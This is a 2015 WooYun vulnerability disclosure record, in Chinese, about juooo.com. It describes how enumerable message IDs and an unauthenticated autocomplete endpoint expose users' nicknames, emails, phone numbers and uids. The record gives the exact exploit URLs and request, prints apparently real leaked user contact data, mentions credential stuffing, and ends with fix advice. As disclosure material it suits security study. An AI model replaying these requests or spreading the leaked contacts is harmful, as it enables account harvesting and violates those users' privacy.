{"id": 68551, "wybug_id": "wooyun-2015-0141288", "wybug_title": "聚橙网某功能缺陷泄漏所有用户重要信息", "wybug_corp": "聚橙网", "wybug_author": "163dotcom", "wybug_date": "2015-09-15 15:11", "wybug_open_date": "2015-10-30 15:12", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄漏", "敏感信息泄露", "用户敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-10-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 聚橙网某功能缺陷泄漏所有用户重要信息 详细说明：  聚橙网查看消息及写消息功能缺陷，导致可获取所有用户的账户重要信息，如昵称、注册邮箱、注册手机号、uid。该漏洞的危害：1）用户敏感信息泄漏（邮箱、手机）。\n\n2）邮箱或手机作为登录名，可通过常用密码字典撞库登录，或爆破。   漏洞证明：  0x01 信息泄漏的入口：消息提醒用户登录后，查看消息提醒地址如下，其中id可遍历：\nhttp://www.juooo.com/myjuooo/view/408408\n首次注册后会收到聚橙小秘书的消息如下：\n\n在地址后面加/1，即可看到收件人的昵称：\nhttp://www.juooo.com/myjuooo/view/408408/1\n\n\n0x02 信息泄漏的关键：方法返回字段写新消息时，输入昵称会根据昵称获取用户信息，抓得地址参数为：\nGET /user/note/touser_autocomp?name=admin HTTP/1.1Host: www.juooo.com\n\n\n经测试，该请求方法没有作限制。输入如：admin，返回的数据如下，包括邮箱、手机、uid：\n[{\"nick_name\":\"admin666\",\"username\":\"861169350@qq.com\",\"id\":\"2825241\"},{\"nick_name\":\"admin     \",\"username\":\"48679394CE9486E7260B78BBAE7532F1\",\"id\":\"2770504\"},{\"nick_name\":\"Admin\",\"username\":\"AB7729CE249340615AC4AE67C6F52424\",\"id\":\"2770173\"},{\"nick_name\":\"admin5\",\"username\":\"admin5@qq.com\",\"id\":\"2174990\"},{\"nick_name\":\"admin5\",\"username\":\"444123794@qq.com\",\"id\":\"2174960\"},{\"nick_name\":\"admin1z\",\"username\":\"13626668520\",\"id\":\"2158079\"},{\"nick_name\":\"admin9988x3X5\",\"username\":\"admin9988x3X5\",\"id\":0},{\"nick_name\":\"admin1718\",\"username\":\"2010092902130964\",\"id\":0},{\"nick_name\":\"admin888\",\"username\":\"73604\",\"id\":0},{\"nick_name\":\"admins\",\"username\":\"68519\",\"id\":0},{\"nick_name\":\"admincsren\",\"username\":\"2010092902080185\",\"id\":0},{\"nick_name\":\"admin_ming\",\"username\":\"64197\",\"id\":0},{\"nick_name\":\"admine\",\"username\":\"61768\",\"id\":0},{\"nick_name\":\"admin123\",\"username\":\"61583\",\"id\":0},{\"nick_name\":\"admin49qht\",\"username\":\"admin49qht\",\"id\":0}]\n0x03 该漏洞的利用编写一个简单的程序，即可收集并保存所有用户的账号信息：\n\n不到10分钟，即可遍历超过1万条消息，提取超过1600个有效账号信息，整理如下。按照此比例，消息共41万条，总共泄漏的账户信息达6万以上：\n\n   修复方案：  建议修复：1）http://www.juooo.com/myjuooo/view/408408 增加权限校验。2）/user/note/touser_autocomp?name=admin 方法可不返回username，或对username进行加密或遮挡处理。   版权声明：转载请注明来源 163dotcom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}